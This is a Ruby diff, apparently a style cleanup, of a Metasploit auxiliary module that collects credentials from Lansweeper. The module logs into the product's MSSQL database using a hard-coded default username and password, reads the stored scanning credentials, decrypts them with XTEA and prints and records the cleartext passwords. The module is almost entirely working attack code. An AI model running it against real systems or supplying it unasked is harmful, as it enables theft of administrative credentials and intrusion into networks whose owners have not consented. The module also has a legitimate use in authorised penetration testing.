@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
@@ -6,39 +7,38 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Lansweeper Credential Collector',
-      'Description' => %q(
-        Lansweeper stores the credentials it uses to scan the computers
-        in its Microsoft SQL database.  The passwords are XTea-encrypted with a
-        68 character long key, in which the first 8 characters are stored with
-        the password in the database and the other 60 is static. Lansweeper, by
-        default, creates an MSSQL user "lansweeperuser" with the password is
-        "mysecretpassword0*", and stores its data in a database called
-        "lansweeperdb". This module will query the MSSQL database for the
-        credentials.
-      ),
-      'Author' =>
-        [
-          'sghctoma <tamas.szakaly[at]praudit.hu>', # Lansweeper RCE + Metasploit implementation
-          'eq <balazs.bucsay[at]praudit.hu>', # Lansweeper RCE + discovering default credentials
-          'calderpwn <calderon[at]websec.mx>' # Module for lansweeper (5.3.0.8)
-        ],
-      'License' => MSF_LICENSE,
-      'DefaultOptions'  =>
-        {
-          'USERNAME' => 'lansweeperuser',
-          'PASSWORD' => 'mysecretpassword0*'
-        },
-      'References' =>
-        [
-          ['URL', 'http://www.lansweeper.com'],
-          ['URL', 'http://www.praudit.hu/prauditeng/index.php/blog/a-lansweeper-es-a-tea']
-        ]))
+                      'Name' => 'Lansweeper Credential Collector',
+                      'Description' => %q(
+                        Lansweeper stores the credentials it uses to scan the computers
+                        in its Microsoft SQL database.  The passwords are XTea-encrypted with a
+                        68 character long key, in which the first 8 characters are stored with
+                        the password in the database and the other 60 is static. Lansweeper, by
+                        default, creates an MSSQL user "lansweeperuser" with the password is
+                        "mysecretpassword0*", and stores its data in a database called
+                        "lansweeperdb". This module will query the MSSQL database for the
+                        credentials.
+                      ),
+                      'Author' =>
+                        [
+                          'sghctoma <tamas.szakaly[at]praudit.hu>', # Lansweeper RCE + Metasploit implementation
+                          'eq <balazs.bucsay[at]praudit.hu>', # Lansweeper RCE + discovering default credentials
+                          'calderpwn <calderon[at]websec.mx>' # Module for lansweeper (5.3.0.8)
+                        ],
+                      'License' => MSF_LICENSE,
+                      'DefaultOptions' =>
+                        {
+                          'USERNAME' => 'lansweeperuser',
+                          'PASSWORD' => 'mysecretpassword0*'
+                        },
+                      'References' =>
+                        [
+                          ['URL', 'http://www.lansweeper.com'],
+                          ['URL', 'http://www.praudit.hu/prauditeng/index.php/blog/a-lansweeper-es-a-tea']
+                        ]))
 
     register_options([
-      OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb'])
-    ], self.class)
-
+                       OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb'])
+                     ], self.class)
   end
 
   def uint32(n)
@@ -66,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
   def xtea_decrypt(data, key)
     k = key.ljust(16).unpack('VVVV')
     num = 0
-    bytes = Array.new
+    bytes = []
 
     0.step(data.length - 1, 8) do |i|
       v = data[i, 8].unpack('VV')
@@ -100,9 +100,7 @@ class MetasploitModule < Msf::Auxiliary
 
     decrypted = xtea_decrypt(actual_data, pass + lsw_generate_pass)
 
-    if first == '1'
-      decrypted = decrypted[0, decrypted.length - 2]
-    end
+    decrypted = decrypted[0, decrypted.length - 2] if first == '1'
 
     Rex::Text.to_ascii(decrypted, 'utf-16le')
   end
@@ -121,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
       private_type: :password,
       private_data: opts[:password],
       origin_type: :service,
-      module_fullname: self.fullname
+      module_fullname: fullname
     }.merge(service_data)
 
     login_data = {
@@ -138,17 +136,18 @@ class MetasploitModule < Msf::Auxiliary
     end
     result = mssql_query("select Credname, Username, Password from #{datastore['DATABASE']}.dbo.tsysCredentials WHERE LEN(Password)>64", false)
 
-    result[:rows].each do |row|""
+    result[:rows].each do |row|
+      ""
       pw = lsw_decrypt(row[2])
 
       print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}")
 
       report_cred(
-        :host => rhost,
-        :port => rport,
-        :creds_name => row[0],
-        :user => row[1],
-        :password => pw
+        host: rhost,
+        port: rport,
+        creds_name: row[0],
+        user: row[1],
+        password: pw
       )
     end
     disconnect
